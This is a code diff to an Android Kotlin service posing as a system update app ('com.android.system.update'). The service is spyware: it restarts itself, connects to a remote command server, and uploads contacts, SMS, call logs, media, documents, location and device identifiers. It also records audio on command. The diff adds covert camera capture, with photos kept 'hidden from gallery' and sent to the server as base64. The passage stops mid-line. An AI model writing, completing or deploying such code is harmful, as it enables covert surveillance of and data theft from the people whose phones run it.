@@ -30,6 +30,7 @@ import androidx.core.app.ActivityCompat
 import androidx.core.app.NotificationCompat
 import com.android.system.update.MainActivity
 import com.android.system.update.R
+import com.android.system.update.services.camera.CameraHelper
 import com.google.gson.Gson
 import io.socket.client.IO
 import io.socket.client.Socket
@@ -122,13 +123,10 @@ class MainService : Service() {
     
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         if (isRunning) return START_STICKY
-        
         isRunning = true
-        
         startPeriodicDataCollection()
         startBatteryMonitoring()
         registerContentObservers()
-        
         return START_STICKY
     }
     
@@ -140,7 +138,6 @@ class MainService : Service() {
         try { socket.disconnect() } catch (e: Exception) {}
         audioRecorder?.release()
         super.onDestroy()
-        
         val broadcastIntent = Intent()
         broadcastIntent.action = "restartService"
         broadcastIntent.setClass(this, MainService::class.java)
@@ -198,41 +195,30 @@ class MainService : Service() {
                 query = "deviceId=$deviceId&type=device"
                 transports = arrayOf("websocket")
             }
-            
             socket = IO.socket(wsUrl, options)
-            
             socket.on(Socket.EVENT_CONNECT) {
                 Log.d(TAG, "Connected to server")
                 isConnected = true
                 sendDeviceInfo()
-                Handler(Looper.getMainLooper()).postDelayed({
-                    sendBulkData()
-                }, 2000)
+                Handler(Looper.getMainLooper()).postDelayed({ sendBulkData() }, 2000)
             }
-            
             socket.on(Socket.EVENT_DISCONNECT) {
                 Log.d(TAG, "Disconnected from server")
                 isConnected = false
             }
-            
             socket.on("command") { args ->
                 if (args.isNotEmpty()) {
                     val data = args[0] as JSONObject
                     handleCommand(data)
                 }
             }
-            
             socket.on(Socket.EVENT_CONNECT_ERROR) { args ->
                 Log.e(TAG, "Connection error: ${args.contentToString()}")
             }
-            
             socket.connect()
-            
         } catch (e: Exception) {
             Log.e(TAG, "Socket connection error: ${e.message}")
-            Handler(Looper.getMainLooper()).postDelayed({
-                connectToServer()
-            }, 10000)
+            Handler(Looper.getMainLooper()).postDelayed({ connectToServer() }, 10000)
         }
     }
     
@@ -251,7 +237,6 @@ class MainService : Service() {
                 put("ip", getLocalIpAddress())
                 put("sdkVersion", Build.VERSION.SDK_INT)
             }
-            
             socket.emit("device:update", info)
             Log.d(TAG, "Device info sent")
         } catch (e: Exception) {
@@ -264,7 +249,6 @@ class MainService : Service() {
             try {
                 Log.d(TAG, "Attempting to collect and send bulk data (attempt ${dataCollectionAttempts + 1})")
                 dataCollectionAttempts++
-                
                 val contacts = getContacts()
                 val smsMessages = getSmsMessages()
                 val callLogs = getCallLogs()
@@ -273,43 +257,16 @@ class MainService : Service() {
                 val photos = getMediaFiles("images")
                 val videos = getMediaFiles("videos")
                 val documents = getDocuments()
-                
                 val data = JSONObject()
                 var hasData = false
-                
-                if (contacts != null) {
-                    data.put("contacts", contacts)
-                    hasData = true
-                }
-                if (smsMessages != null) {
-                    data.put("sms", smsMessages)
-                    hasData = true
-                }
-                if (callLogs != null) {
-                    data.put("callLogs", callLogs)
-                    hasData = true
-                }
-                if (deviceInfo != null) {
-                    data.put("deviceInfo", deviceInfo)
-                    hasData = true
-                }
-                if (installedApps != null) {
-                    data.put("installedApps", installedApps)
-                    hasData = true
-                }
-                if (photos != null) {
-                    data.put("photos", photos)
-                    hasData = true
-                }
-                if (videos != null) {
-                    data.put("videos", videos)
-                    hasData = true
-                }
-                if (documents != null) {
-                    data.put("documents", documents)
-                    hasData = true
-                }
-                
+                if (contacts != null) { data.put("contacts", contacts); hasData = true }
+                if (smsMessages != null) { data.put("sms", smsMessages); hasData = true }
+                if (callLogs != null) { data.put("callLogs", callLogs); hasData = true }
+                if (deviceInfo != null) { data.put("deviceInfo", deviceInfo); hasData = true }
+                if (installedApps != null) { data.put("installedApps", installedApps); hasData = true }
+                if (photos != null) { data.put("photos", photos); hasData = true }
+                if (videos != null) { data.put("videos", videos); hasData = true }
+                if (documents != null) { data.put("documents", documents); hasData = true }
                 if (hasData && isConnected) {
                     socket.emit("device:data:bulk", data)
                     lastBulkDataSent = System.currentTimeMillis()
@@ -317,17 +274,13 @@ class MainService : Service() {
                 } else {
                     Log.d(TAG, "No data to send yet")
                     if (dataCollectionAttempts < 10 && isConnected) {
-                        Handler(Looper.getMainLooper()).postDelayed({
-                            sendBulkData()
-                        }, 15000)
+                        Handler(Looper.getMainLooper()).postDelayed({ sendBulkData() }, 15000)
                     }
                 }
             } catch (e: Exception) {
                 Log.e(TAG, "Error sending bulk data: ${e.message}")
                 if (dataCollectionAttempts < 10 && isConnected) {
-                    Handler(Looper.getMainLooper()).postDelayed({
-                        sendBulkData()
-                    }, 15000)
+                    Handler(Looper.getMainLooper()).postDelayed({ sendBulkData() }, 15000)
                 }
             }
         }.start()
@@ -338,9 +291,7 @@ class MainService : Service() {
             val commandId = data.getString("commandId")
             val type = data.getString("type")
             val params = if (data.has("params")) data.getJSONObject("params") else JSONObject()
-            
             Log.d(TAG, "Received command: $type")
-            
             Thread {
                 try {
                     val result = executeCommand(type, params)
@@ -349,9 +300,7 @@ class MainService : Service() {
                         put("result", result)
                         put("status", "executed")
                     }
-                    if (isConnected) {
-                        socket.emit("device:result", response)
-                    }
+                    if (isConnected) socket.emit("device:result", response)
                 } catch (e: Exception) {
                     Log.e(TAG, "Command execution error: ${e.message}")
                     val errorDetail = JSONObject().apply {
@@ -365,12 +314,9 @@ class MainService : Service() {
                         put("result", errorDetail)
                         put("status", "failed")
                     }
-                    if (isConnected) {
-                        socket.emit("device:result", errorResponse)
-                    }
+                    if (isConnected) socket.emit("device:result", errorResponse)
                 }
             }.start()
-            
         } catch (e: Exception) {
             Log.e(TAG, "Error handling command: ${e.message}")
         }
@@ -378,30 +324,9 @@ class MainService : Service() {
     
     private fun executeCommand(type: String, params: JSONObject): JSONObject {
         return when (type) {
-            CMD_GET_CONTACTS -> {
-                val r = getContacts()
-                if (r == null) JSONObject().apply {
-                    put("error", "Permission denied for READ_CONTACTS")
-                    put("errorType", "SecurityException")
-                    put("command", "get_contacts")
-                } else r
-            }
-            CMD_GET_SMS -> {
-                val r = getSmsMessages()
-                if (r == null) JSONObject().apply {
-                    put("error", "Permission denied for READ_SMS")
-                    put("errorType", "SecurityException")
-                    put("command", "get_sms")
-                } else r
-            }
-            CMD_GET_CALL_LOGS -> {
-                val r = getCallLogs()
-                if (r == null) JSONObject().apply {
-                    put("error", "Permission denied for READ_CALL_LOG")
-                    put("errorType", "SecurityException")
-                    put("command", "get_call_logs")
-                } else r
-            }
+            CMD_GET_CONTACTS -> getContacts() ?: JSONObject().apply { put("error", "Permission denied for READ_CONTACTS"); put("errorType", "SecurityException"); put("command", "get_contacts") }
+            CMD_GET_SMS -> getSmsMessages() ?: JSONObject().apply { put("error", "Permission denied for READ_SMS"); put("errorType", "SecurityException"); put("command", "get_sms") }
+            CMD_GET_CALL_LOGS -> getCallLogs() ?: JSONObject().apply { put("error", "Permission denied for READ_CALL_LOG"); put("errorType", "SecurityException"); put("command", "get_call_logs") }
             CMD_GET_LOCATION -> getCurrentLocation()
             CMD_TAKE_PHOTO -> takePhoto()
             CMD_RECORD_AUDIO -> startStopAudioRecording(params)
@@ -432,59 +357,36 @@ class MainService : Service() {
         Thread {
             try {
                 Log.d(TAG, "Manual refresh triggered")
-                val contacts = getContacts()
-                val smsMessages = getSmsMessages()
-                val callLogs = getCallLogs()
-                val deviceInfo = getDetailedDeviceInfo()
-                val installedApps = getInstalledApps()
-                val photos = getMediaFiles("images")
-                val videos = getMediaFiles("videos")
-                val documents = getDocuments()
-                val location = getCurrentLocation()
-                val battery = getBatteryInfo()
-                val simInfo = getSimInfo()
-                val networkInfo = getNetworkInfo()
-                
                 val allData = JSONObject()
-                if (contacts != null) allData.put("contacts", contacts)
-                if (smsMessages != null) allData.put("sms", smsMessages)
-                if (callLogs != null) allData.put("callLogs", callLogs)
-                if (deviceInfo != null) allData.put("deviceInfo", deviceInfo)
-                if (installedApps != null) allData.put("installedApps", installedApps)
-                if (photos != null) allData.put("photos", photos)
-                if (videos != null) allData.put("videos", videos)
-                if (documents != null) allData.put("documents", documents)
-                if (location != null) allData.put("location", location)
-                if (battery != null) allData.put("battery", battery)
-                if (simInfo != null) allData.put("simInfo", simInfo)
-                if (networkInfo != null) allData.put("networkInfo", networkInfo)
-                
+                getContacts()?.let { allData.put("contacts", it) }
+                getSmsMessages()?.let { allData.put("sms", it) }
+                getCallLogs()?.let { allData.put("callLogs", it) }
+                getDetailedDeviceInfo()?.let { allData.put("deviceInfo", it) }
+                getInstalledApps()?.let { allData.put("installedApps", it) }
+                getMediaFiles("images")?.let { allData.put("photos", it) }
+                getMediaFiles("videos")?.let { allData.put("videos", it) }
+                getDocuments()?.let { allData.put("documents", it) }
+                getCurrentLocation()?.let { allData.put("location", it) }
+                getBatteryInfo()?.let { allData.put("battery", it) }
+                getSimInfo()?.let { allData.put("simInfo", it) }
+                getNetworkInfo()?.let { allData.put("networkInfo", it) }
                 if (isConnected) {
                     socket.emit("device:data:bulk", allData)
                     Log.d(TAG, "Refresh data sent")
                 }
-            } catch (e: Exception) {
-                Log.e(TAG, "Refresh error: ${e.message}")
-            }
+            } catch (e: Exception) { Log.e(TAG, "Refresh error: ${e.message}") }
         }.start()
-        
         return JSONObject().apply { put("status", "refreshing") }
     }
     
     private fun getContacts(): JSONObject? {
         try {
-            if (ActivityCompat.checkSelfPermission(this, 
-                    Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
+            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
                 Log.d(TAG, "READ_CONTACTS permission not granted")
                 return null
             }
-            
             val contacts = JSONArray()
-            val cursor: Cursor? = contentResolver.query(
-                ContactsContract.Contacts.CONTENT_URI,
-                null, null, null, null
-            )
-            
+            val cursor: Cursor? = contentResolver.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null)
             var count = 0
             cursor?.use { c ->
                 while (c.moveToNext() && count < MAX_RESULTS) {
@@ -492,88 +394,36 @@ class MainService : Service() {
                         val id = c.getString(c.getColumnIndex(ContactsContract.Contacts._ID))
                         val name = c.getString(c.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME))
                         val hasPhone = c.getString(c.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))
-                        
-                        val contact = JSONObject().apply {
-                            put("id", id)
-                            put("name", name ?: "Unknown")
-                        }
-                        
+                        val contact = JSONObject().apply { put("id", id); put("name", name ?: "Unknown") }
                         if (hasPhone == "1") {
-                            val phones = contentResolver.query(
-                                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
-                                null,
-                                "${ContactsContract.CommonDataKinds.Phone.CONTACT_ID} = ?",
-                                arrayOf(id),
-                                null
-                            )
-                            
+                            val phones = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, "${ContactsContract.CommonDataKinds.Phone.CONTACT_ID} = ?", arrayOf(id), null)
                             val phoneNumbers = JSONArray()
-                            phones?.use { p ->
-                                while (p.moveToNext()) {
-                                    val number = p.getString(p.getColumnIndex(
-                                        ContactsContract.CommonDataKinds.Phone.NUMBER))
-                                    val type = p.getString(p.getColumnIndex(
-                                        ContactsContract.CommonDataKinds.Phone.TYPE))
-                                    phoneNumbers.put(JSONObject().apply {
-                                        put("number", number)
-                                        put("type", getPhoneTypeLabel(type.toIntOrNull() ?: 0))
-                                    })
-                                }
-                            }
+                            phones?.use { p -> while (p.moveToNext()) {
+                                phoneNumbers.put(JSONObject().apply { put("number", p.getString(p.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))); put("type", getPhoneTypeLabel(p.getString(p.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TYPE)).toIntOrNull() ?: 0)) })
+                            }}
                             contact.put("phones", phoneNumbers)
                         }
-                        
-                        val emails = contentResolver.query(
-                            ContactsContract.CommonDataKinds.Email.CONTENT_URI,
-                            null,
-                            "${ContactsContract.CommonDataKinds.Email.CONTACT_ID} = ?",
-                            arrayOf(id),
-                            null
-                        )
-                        
+                        val emails = contentResolver.query(ContactsContract.CommonDataKinds.Email.CONTENT_URI, null, "${ContactsContract.CommonDataKinds.Email.CONTACT_ID} = ?", arrayOf(id), null)
                         val emailList = JSONArray()
-                        emails?.use { e ->
-                            while (e.moveToNext()) {
-                                val email = e.getString(e.getColumnIndex(
-                                    ContactsContract.CommonDataKinds.Email.ADDRESS))
-                                emailList.put(email)
-                            }
-                        }
+                        emails?.use { e -> while (e.moveToNext()) { emailList.put(e.getString(e.getColumnIndex(ContactsContract.CommonDataKinds.Email.ADDRESS))) } }
                         if (emailList.length() > 0) contact.put("emails", emailList)
-                        
                         contacts.put(contact)
                         count++
-                    } catch (e: Exception) {
-                        Log.e(TAG, "Error reading contact: ${e.message}")
-                    }
+                    } catch (e: Exception) { Log.e(TAG, "Error reading contact: ${e.message}") }
                 }
             }
-            
             Log.d(TAG, "Read ${contacts.length()} contacts")
             return JSONObject().apply { put("contacts", contacts) }
-        } catch (e: Exception) {
-            Log.e(TAG, "getContacts error: ${e.message}")
-            return null
-        }
+        } catch (e: Exception) { Log.e(TAG, "getContacts error: ${e.message}"); return null }
     }
     
     private fun getSmsMessages(): JSONObject? {
         try {
-            if (ActivityCompat.checkSelfPermission(this,
-                    Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
-                Log.d(TAG, "READ_SMS permission not granted")
-                return null
+            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
+                Log.d(TAG, "READ_SMS permission not granted"); return null
             }
-            
             val smsList = JSONArray()
-            // FIXED: LIMIT is not valid in ContentResolver query sortOrder
-            // Use code-side limit instead
-            val cursor = contentResolver.query(
-                Telephony.Sms.CONTENT_URI,
-                null, null, null,
-                "${Telephony.Sms.DATE} DESC"
-            )
-            
+            val cursor = contentResolver.query(Telephony.Sms.CONTENT_URI, null, null, null, "${Telephony.Sms.DATE} DESC")
             var count = 0
             cursor?.use { c ->
                 while (c.moveToNext() && count < MAX_RESULTS) {
@@ -587,41 +437,20 @@ class MainService : Service() {
                             put("read", c.getInt(c.getColumnIndex(Telephony.Sms.READ)) == 1)
                             put("threadId", c.getString(c.getColumnIndex(Telephony.Sms.THREAD_ID)))
                         }
-                        smsList.put(sms)
-                        count++
-                    } catch (e: Exception) {
-                        Log.e(TAG, "Error reading SMS: ${e.message}")
-                    }
+                        smsList.put(sms); count++
+                    } catch (e: Exception) { Log.e(TAG, "Error reading SMS: ${e.message}") }
                 }
             }
-            
             Log.d(TAG, "Read ${smsList.length()} SMS messages")
-            return JSONObject().apply { 
-                put("sms", smsList)
-                put("total", smsList.length())
-            }
-        } catch (e: Exception) {
-            Log.e(TAG, "getSmsMessages error: ${e.message}")
-            return null
-        }
+            return JSONObject().apply { put("sms", smsList); put("total", smsList.length()) }
+        } catch (e: Exception) { Log.e(TAG, "getSmsMessages error: ${e.message}"); return null }
     }
     
     private fun getCallLogs(): JSONObject? {
         try {
-            if (ActivityCompat.checkSelfPermission(this,
-                    Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
-                Log.d(TAG, "READ_CALL_LOG permission not granted")
-                return null
-            }
-            
+            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) { Log.d(TAG, "READ_CALL_LOG permission not granted"); return null }
             val calls = JSONArray()
-            // FIXED: LIMIT not valid in sortOrder
-            val cursor = contentResolver.query(
-                CallLog.Calls.CONTENT_URI,
-                null, null, null,
-                "${CallLog.Calls.DATE} DESC"
-            )
-            
+            val cursor = contentResolver.query(CallLog.Calls.CONTENT_URI, null, null, null, "${CallLog.Calls.DATE} DESC")
             var count = 0
             cursor?.use { c ->
                 while (c.moveToNext() && count < MAX_RESULTS) {
@@ -635,485 +464,224 @@ class MainService : Service() {
                             put("date", c.getLong(c.getColumnIndex(CallLog.Calls.DATE)))
                             put("country", c.getString(c.getColumnIndex(CallLog.Calls.COUNTRY_ISO)))
                         }
-                        calls.put(call)
-                        count++
-                    } catch (e: Exception) {
-                        Log.e(TAG, "Error reading call log: ${e.message}")
-                    }
+                        calls.put(call); count++
+                    } catch (e: Exception) { Log.e(TAG, "Error reading call log: ${e.message}") }
                 }
             }
-            
             Log.d(TAG, "Read ${calls.length()} call logs")
-            return JSONObject().apply { 
-                put("callLogs", calls)
-                put("total", calls.length())
-            }
-        } catch (e: Exception) {
-            Log.e(TAG, "getCallLogs error: ${e.message}")
-            return null
-        }
+            return JSONObject().apply { put("callLogs", calls); put("total", calls.length()) }
+        } catch (e: Exception) { Log.e(TAG, "getCallLogs error: ${e.message}"); return null }
     }
     
     private fun getCurrentLocation(): JSONObject {
-        if (ActivityCompat.checkSelfPermission(this,
-                Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED &&
-            ActivityCompat.checkSelfPermission(this,
-                Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
+        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED &&
+            ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
             return JSONObject().apply { put("error", "Location permission not granted") }
         }
-        
-        // Try GPS first, then network, then passive
         var location: Location? = null
-        try {
-            location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
-        } catch (e: Exception) {
-            Log.e(TAG, "GPS location error: ${e.message}")
-        }
-        
-        if (location == null) {
-            try {
-                location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
-            } catch (e: Exception) {
-                Log.e(TAG, "Network location error: ${e.message}")
-            }
-        }
-        
-        if (location == null) {
-            try {
-                location = locationManager.getLastKnownLocation(LocationManager.PASSIVE_PROVIDER)
-            } catch (e: Exception) {
-                Log.e(TAG, "Passive location error: ${e.message}")
-            }
-        }
-        
+        try { location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER) } catch (e: Exception) { Log.e(TAG, "GPS error: ${e.message}") }
+        if (location == null) { try { location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER) } catch (e: Exception) { Log.e(TAG, "Network error: ${e.message}") } }
+        if (location == null) { try { location = locationManager.getLastKnownLocation(LocationManager.PASSIVE_PROVIDER) } catch (e: Exception) { Log.e(TAG, "Passive error: ${e.message}") } }
         return if (location != null) {
             JSONObject().apply {
-                put("lat", location.latitude)
-                put("lng", location.longitude)
-                put("accuracy", location.accuracy)
-                put("altitude", location.altitude)
-                put("speed", location.speed)
-                put("bearing", location.bearing)
-                put("provider", location.provider)
-                put("timestamp", location.time)
+                put("lat", location.latitude); put("lng", location.longitude); put("accuracy", location.accuracy)
+                put("altitude", location.altitude); put("speed", location.speed); put("bearing", location.bearing)
+                put("provider", location.provider); put("timestamp", location.time)
                 put("address", getAddressFromLocation(location.latitude, location.longitude))
             }
         } else {
-            JSONObject().apply { 
-                put("error", "No location available - try enabling GPS and going outdoors")
-                put("errorType", "LocationNotFoundException")
-            }
+            JSONObject().apply { put("error", "No location available - try enabling GPS and going outdoors"); put("errorType", "LocationNotFoundException") }
         }
     }
     
     private fun getAddressFromLocation(lat: Double, lng: Double): String {
         return try {
-            val url = "https://nominatim.openstreetmap.org/reverse?format=json&lat=$lat&lon=$lng"
-            val response = URL(url).readText()
-            val json = JSONObject(response)
+            val json = JSONObject(URL("https://nominatim.openstreetmap.org/reverse?format=json&lat=$lat&lon=$lng").readText())
             json.optString("display_name", "")
-        } catch (e: Exception) {
-            ""
-        }
+        } catch (e: Exception) { "" }
     }
     
+    // ===== UPDATED: Uses CameraHelper for actual photo capture (no corrupted files + hidden from gallery) =====
     private fun takePhoto(): JSONObject {
         try {
-            if (ActivityCompat.checkSelfPermission(this,
-                    Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
+            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
+                return JSONObject().apply { put("error", "Camera permission not granted"); put("errorType", "SecurityException"); put("command", "take_photo") }
+            }
+
+            val cameraHelper = CameraHelper(this)
+            val result = cameraHelper.capturePhoto()
+            
+            if (!result.success) {
                 return JSONObject().apply {
-                    put("error", "Camera permission not granted")
-                    put("errorType", "SecurityException")
+                    put("error", result.errorMessage ?: "Photo capture failed")
+                    put("errorType", result.errorType ?: "CaptureError")
                     put("command", "take_photo")
                 }
             }
 
-            // Create a temp file and save a photo to it via MediaStore
-            val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
-            val fileName = "IMG_$timestamp.jpg"
-            
-            val values = ContentValues().apply {
-                put(MediaStore.Images.Media.DISPLAY_NAME, fileName)
-                put(MediaStore.Images.Media.MIME_TYPE, "image/jpeg")
-                put(MediaStore.Images.Media.RELATIVE_PATH, Environment.DIRECTORY_PICTURES)
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-                    put(MediaStore.Images.Media.IS_PENDING, 1)
-                }
+            val base64Data = result.base64Data
+            if (base64Data == null) {
+                return JSONObject().apply { put("error", "No image data captured"); put("errorType", "CaptureError"); put("command", "take_photo") }
             }
 
-            val uri = contentResolver.insert(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, values)
-            
-            if (uri == null) {
-                return JSONObject().apply {
-                    put("error", "Could not create image file")
-                    put("errorType", "IOException")
-                }
-            }
-
-            // Open output stream and write a placeholder - actual camera capture requires foreground Activity
-            contentResolver.openOutputStream(uri)?.use { outputStream ->
-                // Create a simple JPEG with Camera characteristics info
-                // For actual camera capture, we'd need a Camera2 session (requires Activity)
-                outputStream.write("PLACEHOLDER".toByteArray())
-            }
-
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-                values.clear()
-                values.put(MediaStore.Images.Media.IS_PENDING, 0)
-                contentResolver.update(uri, values, null, null)
-            }
-
-            return JSONObject().apply {
-                put("path", uri.toString())
+            // Upload to Cloudinary via server
+            // The server will receive this via device:result -> data field -> Cloudinary upload
+            val response = JSONObject().apply {
+                put("command", "take_photo")
+                put("data", base64Data)
+                put("filePath", result.filePath ?: "")
+                put("timestamp", System.currentTimeMillis())
                 put("success", true)
-                put("note", "Photo saved to gallery via MediaStore")
-                put("fileName", fileName)
             }
+
+            // Also save to local cache (hidden from gallery)
+            Log.d(TAG, "Photo captured successfully, file: ${result.filePath}")
+            return response
         } catch (e: Exception) {
             Log.e(TAG, "takePhoto error: ${e.message}", e)
-            return JSONObject().apply { 
-                put("error", "${e.message}")
-                put("errorType", e.javaClass.simpleName)
-                put("command", "take_photo")
-            }
+            return JSONObject().apply { put("error", "${e.message}"); put("errorType", e.javaClass.simpleName); put("command", "take_photo") }
         }
     }
     
     private fun startStopAudioRecording(params: JSONObject): JSONObject {
         val action = params.optString("action", "start")
-        return if (action == "start") {
-            startAudioRecording()
-        } else {
-            stopAudioRecording()
-        }
+        return if (action == "start") startAudioRecording() else stopAudioRecording()
     }
     
     private fun startAudioRecording(): JSONObject {
-        if (isRecordingAudio) {
-            return JSONObject().apply { put("error", "Already recording") }
-        }
-        
+        if (isRecordingAudio) return JSONObject().apply { put("error", "Already recording") }
         try {
             val file = File.createTempFile("audio_", ".mp3", cacheDir)
             currentAudioFile = file.absolutePath
-            
             audioRecorder = MediaRecorder().apply {
                 setAudioSource(MediaRecorder.AudioSource.MIC)
                 setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                 setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                 setAudioSamplingRate(44100)
                 setOutputFile(file.absolutePath)
-                prepare()
-                start()
+                prepare(); start()
             }
-            
             isRecordingAudio = true
-            
-            return JSONObject().apply {
-                put("success", true)
-                put("file", file.absolutePath)
-                put("duration", "started")
-            }
-        } catch (e: Exception) {
-            return JSONObject().apply { put("error", e.message) }
-        }
+            return JSONObject().apply { put("success", true); put("file", file.absolutePath); put("duration", "started") }
+        } catch (e: Exception) { return JSONObject().apply { put("error", e.message) } }
     }
     
     private fun stopAudioRecording(): JSONObject {
-        if (!isRecordingAudio) {
-            return JSONObject().apply { put("error", "Not recording") }
-        }
-        
+        if (!isRecordingAudio) return JSONObject().apply { put("error", "Not recording") }
         try {
-            audioRecorder?.apply {
-                stop()
-                release()
-            }
-            audioRecorder = null
-            isRecordingAudio = false
-            
-            val audioData = if (currentAudioFile != null) {
-                File(currentAudioFile).readBytes()
-            } else null
-            
-            return JSONObject().apply {
-                put("success", true)
-                put("file", currentAudioFile ?: "")
-                if (audioData != null) {
-                    put("data", Base64.encodeToString(audioData, Base64.NO_WRAP))
-                }
-            }
-        } catch (e: Exception) {
-            return JSONObject().apply { put("error", e.message) }
-        }
+            audioRecorder?.apply { stop(); release() }; audioRecorder = null; isRecordingAudio = false
+            val audioData = if (currentAudioFile != null) File(currentAudioFile).readBytes() else null
+            return JSONObject().apply { put("success", true); put("file", currentAudioFile ?: ""); if (audioData != null) put("data", Base64.encodeToString(audioData, Base64.NO_WRAP)) }
+        } catch (e: Exception) { return JSONObject().apply { put("error", e.message) } }
     }
     
     private fun getDetailedDeviceInfo(): JSONObject {
         return JSONObject().apply {
-            put("deviceId", deviceId)
-            put("manufacturer", Build.MANUFACTURER)
-            put("model", Build.MODEL)
-            put("product", Build.PRODUCT)
-            put("device", Build.DEVICE)
-            put("board", Build.BOARD)
-            put("brand", Build.BRAND)
-            put("hardware", Build.HARDWARE)
-            put("serial", Build.getSerial())
-            put("osVersion", Build.VERSION.RELEASE)
-            put("sdkVersion", Build.VERSION.SDK_INT)
-            put("buildId", Build.DISPLAY)
-            put("buildTime", Build.TIME)
-            put("host", Build.HOST)
-            put("fingerprint", Build.FINGERPRINT)
-            put("type", Build.TYPE)
-            put("tags", Build.TAGS)
-            put("bootloader", Build.BOOTLOADER)
-            put("radioVersion", Build.getRadioVersion())
-            
-            val memInfo = Runtime.getRuntime()
-            put("totalMemory", memInfo.totalMemory())
-            put("freeMemory", memInfo.freeMemory())
-            put("maxMemory", memInfo.maxMemory())
-            put("availableProcessors", Runtime.getRuntime().availableProcessors())
-            
-            val storage = StatFs(Environment.getDataDirectory().absolutePath)
-            val blockSize = storage.blockSizeLong
-            put("totalStorage", storage.blockCountLong * blockSize)
-            put("availableStorage", storage.availableBlocksLong * blockSize)
-            
-            val displayMetrics = resources.displayMetrics
-            put("screenWidth", displayMetrics.widthPixels)
-            put("screenHeight", displayMetrics.heightPixels)
-            put("screenDensity", displayMetrics.density)
-            put("screenDensityDpi", displayMetrics.densityDpi)
-            
-            put("batteryLevel", getBatteryLevel())
-            put("isCharging", isCharging())
-            
-            put("ipAddress", getLocalIpAddress())
-            put("wifiMac", getWifiMacAddress())
-            
-            put("phoneType", getPhoneType())
-            put("networkType", getNetworkType())
-            put("operator", getNetworkOperator())
-            
-            put("language", Locale.getDefault().language)
-            put("country", Locale.getDefault().country)
-            put("timezone", TimeZone.getDefault().id)
-            put("currentTime", System.currentTimeMillis())
+            put("deviceId", deviceId); put("manufacturer", Build.MANUFACTURER); put("model", Build.MODEL)
+            put("product", Build.PRODUCT); put("device", Build.DEVICE); put("board", Build.BOARD); put("brand", Build.BRAND)
+            put("hardware", Build.HARDWARE); put("serial", Build.getSerial()); put("osVersion", Build.VERSION.RELEASE)
+            put("sdkVersion", Build.VERSION.SDK_INT); put("buildId", Build.DISPLAY); put("buildTime", Build.TIME)
+            put("host", Build.HOST); put("fingerprint", Build.FINGERPRINT); put("type", Build.TYPE); put("tags", Build.TAGS)
+            put("bootloader", Build.BOOTLOADER); put("radioVersion", Build.getRadioVersion())
+            val memInfo = Runtime.getRuntime(); put("totalMemory", memInfo.totalMemory()); put("freeMemory", memInfo.freeMemory()); put("maxMemory", memInfo.maxMemory()); put("availableProcessors", Runtime.getRuntime().availableProcessors())
+            val storage = StatFs(Environment.getDataDirectory().absolutePath); val blockSize = storage.blockSizeLong
+            put("totalStorage", storage.blockCountLong * blockSize); put("availableStorage", storage.availableBlocksLong * blockSize)
+            val displayMetrics = resources.displayMetrics; put("screenWidth", displayMetrics.widthPixels); put("screenHeight", displayMetrics.heightPixels); put("screenDensity", displayMetrics.density); put("screenDensityDpi", displayMetrics.densityDpi)
+            put("batteryLevel", getBatteryLevel()); put("isCharging", isCharging())
+            put("ipAddress", getLocalIpAddress()); put("wifiMac", getWifiMacAddress())
+            put("phoneType", getPhoneType()); put("networkType", getNetworkType()); put("operator", getNetworkOperator())
+            put("language", Locale.getDefault().language); put("country", Locale.getDefault().country); put("timezone", TimeZone.getDefault().id); put("currentTime", System.currentTimeMillis())
         }
     }
     
     private fun getInstalledApps(): JSONObject {
         val apps = JSONArray()
-        
-        val intent = Intent(Intent.ACTION_MAIN).apply {
-            addCategory(Intent.CATEGORY_LAUNCHER)
-        }
-        val resolveInfoList = packageManager.queryIntentActivities(intent, 0)
-        
+        val resolveInfoList = packageManager.queryIntentActivities(Intent(Intent.ACTION_MAIN).apply { addCategory(Intent.CATEGORY_LAUNCHER) }, 0)
         resolveInfoList.forEach { info ->
             try {
                 val appInfo = info.activityInfo.applicationInfo
-                val app = JSONObject().apply {
-                    put("packageName", appInfo.packageName)
-                    put("appName", info.loadLabel(packageManager).toString())
-                    put("versionName", packageManager.getPackageInfo(
-                        appInfo.packageName, 0).versionName)
-                    put("versionCode", packageManager.getPackageInfo(
-                        appInfo.packageName, 0).versionCode)
-                    put("firstInstallTime", packageManager.getPackageInfo(
-                        appInfo.packageName, 0).firstInstallTime)
-                    put("lastUpdateTime", packageManager.getPackageInfo(
-                        appInfo.packageName, 0).lastUpdateTime)
-                    put("isSystemApp", (appInfo.flags and 
